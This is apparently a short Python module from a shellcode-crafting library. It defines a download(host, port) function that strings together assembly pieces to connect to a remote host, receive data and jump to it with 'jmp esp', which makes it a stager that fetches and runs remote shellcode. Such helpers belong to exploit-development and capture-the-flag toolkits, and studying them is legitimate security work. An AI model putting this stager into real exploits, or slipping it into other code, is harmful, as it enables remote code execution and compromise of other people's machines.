from . import *

def download(host, port):
    """Args: host, port
    Download shellcode from host on port, and run it."""
    return \
        connect(host, port) + \
        recv() + \
        'jmp esp'
